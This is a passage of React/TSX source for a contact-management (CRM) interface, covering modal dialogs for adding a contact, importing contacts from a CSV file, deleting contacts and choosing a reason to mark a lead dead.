                    <label style={css("display:flex; flex-direction:column; gap:6px;")}>
                      <span style={css("font-size:12px; font-weight:500; color:#575753;")}>Company</span>
                      <Box as="input" value={f.company} maxLength={LIMITS.company} onChange={(e: any) => setForm({ company: e.target.value })} placeholder="Company" style={css(inputStyle)} focus={css("border-color:#c9c9c3;")} />
                    </label>
                  </div>
                  <div style={css("display:grid; grid-template-columns:1fr 1fr; gap:12px;")}>
                    <label style={css("display:flex; flex-direction:column; gap:6px;")}>
                      <span style={css("font-size:12px; font-weight:500; color:#575753;")}>Email</span>
                      <Box as="input" type="email" value={f.email} maxLength={LIMITS.email} onChange={(e: any) => setForm({ email: e.target.value })} placeholder="name@company.com" style={css(inputStyle)} focus={css("border-color:#c9c9c3;")} />
                    </label>
                    <label style={css("display:flex; flex-direction:column; gap:6px;")}>
                      <span style={css("font-size:12px; font-weight:500; color:#575753;")}>Phone</span>
                      <Box as="input" value={f.phone} maxLength={LIMITS.phone} onChange={(e: any) => setForm({ phone: e.target.value })} placeholder="+1 (555) 000-0000" style={css(inputStyle)} focus={css("border-color:#c9c9c3;")} />
                    </label>
                  </div>
                  <label style={css("display:flex; flex-direction:column; gap:6px;")}>
                    <span style={css("font-size:12px; font-weight:500; color:#575753;")}>LinkedIn</span>
                    <Box as="input" value={f.linkedin} maxLength={LIMITS.linkedin} onChange={(e: any) => setForm({ linkedin: e.target.value })} placeholder="linkedin.com/in/handle" style={css(inputStyle)} focus={css("border-color:#c9c9c3;")} />
                  </label>
                  <div style={css("display:flex; flex-direction:column; gap:7px;")}>
                    <span style={css("font-size:12px; font-weight:500; color:#575753;")}>Loops</span>
                    <div style={css("display:flex; gap:8px;")}>
                      <button onClick={() => toggleFormLoop(1)} style={css(loopChip(1, f.loops.includes(1)))}><span style={css("width:8px;height:8px;border-radius:3px;background:#9a9a95;")} />Loop 1 · always-on</button>
                      <button onClick={() => toggleFormLoop(2)} style={css(loopChip(2, f.loops.includes(2)))}><span style={css("width:8px;height:8px;border-radius:3px;background:#e0930a;")} />Loop 2 · blitz</button>
                    </div>
                  </div>
                  {f.loops.includes(2) && (
                    <label style={css("display:flex; flex-direction:column; gap:6px;")}>
                      <span style={css("font-size:12px; font-weight:500; color:#575753;")}>Community / Event <span style={css("color:#a3a39d; font-weight:450;")}>· where they came from</span></span>
                      <Box as="input" list="slcrm-sources" value={f.source} maxLength={LIMITS.source} onChange={(e: any) => setForm({ source: e.target.value })} placeholder="e.g. Naturally Network Denver, Newtopia" style={css(inputStyle)} focus={css("border-color:#c9c9c3;")} />
                      <datalist id="slcrm-sources">
                        {sources.map((s) => (
                          <option key={s} value={s} />
                        ))}
                      </datalist>
                    </label>
                  )}
                  <div style={css("display:flex; flex-direction:column; gap:7px;")}>
                    <span style={css("font-size:12px; font-weight:500; color:#575753;")}>Owner</span>
                    <div style={css("display:flex; gap:8px;")}>
                      {formOwners.map((o, j) => (
                        <button key={j} onClick={o.onClick} style={css(o.style)}>
                          {o.hasAvatar && <span style={css(`width:16px;height:16px;border-radius:5px;background:${o.color};color:#fff;display:flex;align-items:center;justify-content:center;font-size:9px;font-weight:600;`)}>{o.initial}</span>}
                          {o.label}
                        </button>
                      ))}
                    </div>
                  </div>
                  <div style={css("display:flex; flex-direction:column; gap:7px;")}>
                    <span style={css("font-size:12px; font-weight:500; color:#575753;")}>Status</span>
                    <div style={css("display:flex; gap:7px; flex-wrap:wrap;")}>
                      {STATUSES.map((s) => (
                        <button key={s.id} onClick={() => setForm({ status: s.id })} style={css(`display:flex;align-items:center;gap:7px;padding:7px 11px;border-radius:8px;border:1px solid ${s.id === f.status ? "#c9c9c3" : "#e6e6e2"};background:${s.id === f.status ? "#f4f4f1" : "#fff"};color:#3a3a38;font-size:12.5px;font-family:inherit;cursor:pointer;`)}>
                          <span style={css(`width:6px;height:6px;border-radius:4px;background:${s.dot};`)} />{s.id}
                        </button>
                      ))}
                    </div>
                  </div>
                  <div style={css("display:flex; justify-content:flex-end; gap:8px; margin-top:2px;")}>
                    <Box as="button" onClick={closeModal} style={css("border:1px solid #e6e6e2; background:#fff; padding:9px 15px; border-radius:9px; font-size:13px; font-family:inherit; cursor:pointer; color:#575753;")} hover={css("background:#f4f4f1;")}>Cancel</Box>
                    <button onClick={submitAdd} style={css(`border:none;background:${f.name.trim() ? "#1a1a1a" : "#c9c9c3"};color:#fff;padding:9px 16px;border-radius:9px;font-size:13px;font-weight:500;font-family:inherit;cursor:${f.name.trim() ? "pointer" : "default"};`)}>Add contact</button>
                  </div>
                </div>
              </>
            )}

            {S.modal === "csv" && (
              <>
                <div style={css("padding:20px 22px 16px; border-bottom:1px solid #ededea; display:flex; align-items:center; justify-content:space-between;")}>
                  <div style={css("font-size:16px; font-weight:600; letter-spacing:-0.01em;")}>Import contacts</div>
                  <Box as="button" onClick={closeModal} style={css("border:none; background:#f2f2ef; width:28px; height:28px; border-radius:8px; cursor:pointer; display:flex; align-items:center; justify-content:center; color:#6b6b66;")} hover={css("background:#e8e8e4;")}><IconClose size={15} /></Box>
                </div>
                <div style={css("padding:18px 22px 22px; display:flex; flex-direction:column; gap:12px;")}>
                  <Box
                    as="label"
                    onDragOver={onCsvDragOver}
                    onDragEnter={onCsvDragOver}
                    onDragLeave={onCsvDragLeave}
                    onDrop={onCsvDrop}
                    style={css(
                      `display:flex; flex-direction:column; align-items:center; justify-content:center; gap:8px; text-align:center; padding:24px 18px; border:1.5px dashed ${S.csvDragging ? "#8a8a84" : "#d8d8d3"}; border-radius:12px; background:${S.csvDragging ? "#f4f4f1" : "#fbfbfa"}; cursor:pointer; transition:background 0.12s, border-color 0.12s;`,
                    )}
                    hover={css("background:#f4f4f1; border-color:#c9c9c3;")}
                  >
                    <input type="file" accept=".csv,text/csv" onChange={onCsvFileInput} style={css("display:none;")} />
                    <span style={css("width:34px; height:34px; border-radius:9px; background:#eeeee9; color:#75756f; display:flex; align-items:center; justify-content:center;")}>
                      <IconUpload />
                    </span>
                    <div style={css("font-size:13px; font-weight:500; color:#3a3a38;")}>
                      {S.csvFileName ? `Loaded ${S.csvFileName}` : "Drag & drop a .csv, or click to browse"}
                    </div>
                    <div style={css("font-size:11.5px; color:#a3a39d; line-height:1.5;")}>
                      {S.csvFileName
                        ? "Click Import contacts to finish - or drop another file."
                        : "One contact per line: Name, Company, Loop, Owner, Status, Source, Email, Phone, LinkedIn"}
                    </div>
                  </Box>
                  {(S.csvError || S.actionError) && (
                    <div style={css("font-size:12px; color:#c2410c;")}>{S.csvError || S.actionError}</div>
                  )}
                  <div style={css("display:flex; justify-content:flex-end; gap:8px; margin-top:2px;")}>
                    <Box as="button" onClick={closeModal} style={css("border:1px solid #e6e6e2; background:#fff; padding:9px 15px; border-radius:9px; font-size:13px; font-family:inherit; cursor:pointer; color:#575753;")} hover={css("background:#f4f4f1;")}>Cancel</Box>
                    <Box as="button" onClick={importCsv} style={css("border:none; background:#1a1a1a; color:#fff; padding:9px 16px; border-radius:9px; font-size:13px; font-weight:500; font-family:inherit; cursor:pointer;")} hover={css("background:#333;")}>Import contacts</Box>
                  </div>
                </div>
              </>
            )}

            {S.modal === "delete" && (
              <DeleteContactsModal
                targets={deleteTargets}
                pending={submitPending}
                actionError={S.actionError}
                onCancel={closeModal}
                onConfirm={confirmDelete}
              />
            )}

            {S.modal === "deadReason" && (
              <DeadReasonModal
                targetName={deadTargetName}
                actionError={S.actionError}
                onPick={confirmDead}
                onCancel={closeModal}
              />
            )}
          </div>
        </div>
      )}
    </div>
  );
}
